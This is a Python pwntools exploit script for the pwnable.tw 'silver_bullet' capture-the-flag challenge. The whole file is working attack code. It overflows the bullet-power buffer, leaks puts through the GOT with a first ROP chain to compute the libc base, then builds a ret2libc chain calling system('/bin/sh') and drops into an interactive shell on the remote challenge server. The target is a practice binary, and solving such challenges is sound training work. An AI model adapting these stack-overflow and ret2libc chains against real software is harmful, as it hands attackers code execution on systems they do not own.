from pwn import *

elf = ELF("./silver_bullet_patched")
libc = ELF("./libc.so.6")

context.binary = elf
context.terminal = "kitty @ launch --location=vsplit --cwd=current".split()
#context.log_level = 'debug'

def conn():
    if args.REMOTE:
        p = remote("chall.pwnable.tw", 10103)
    else:
        if args.GDB:
            p = gdb.debug([elf.path], aslr=True, api=False, gdb_args=["-x", "./.gdbinit"], gdbscript="""
                b *main+48
                """)
        else:
            p = process([elf.path])

    return p

def menu(p):
    p.recvuntil(b"Your choice :")

def create(p, desc: bytes):
    menu(p)
    p.send(b"1")
    p.sendafter(b"bullet :", desc)
    p.recvuntil(b"is : ")
    return p.recvline().strip()

def power_up(p, desc):
    menu(p)
    p.send(b"2")
    p.sendafter(b"bullet :", desc)
    p.recvuntil(b"is : ")
    return p.recvline().strip()

def beat(p):
    menu(p)
    p.send(b"3")

def main():
    p = conn()

    # pwn it
    power = int(create(p, b"A"*(0x30 - 1)))
    log.info(f"{power = }")

    power = int(power_up(p, b"A"))
    log.info(f"{power = }")
    
    payload = b"Y"*3
    payload += b"Z"*4
    payload += p32(elf.plt.puts)
    payload += p32(elf.sym.main)
    payload += p32(elf.got.puts)

    power_up(p, payload)
    beat(p)
    beat(p)
    
    p.recvuntil(b"Oh ! You win !!\n")

    leak = u32(p.recv(4))
    log.info(f"leak: {hex(leak)}")

    libc.address = leak - libc.sym.puts
    log.success(f"libc base address: {hex(libc.address)}")

    rop = ROP(libc)
    rop.system(next(libc.search("/bin/sh\x00")))
    
    print(rop.dump())

    create(p, b"A"*(0x30-1))
    power_up(p, b"A")

    payload = b"A"*3 + b"B" * 4 + rop.chain()
    power_up(p, payload)
    beat(p)
    beat(p)

    p.interactive()

if __name__ == '__main__':
    main()
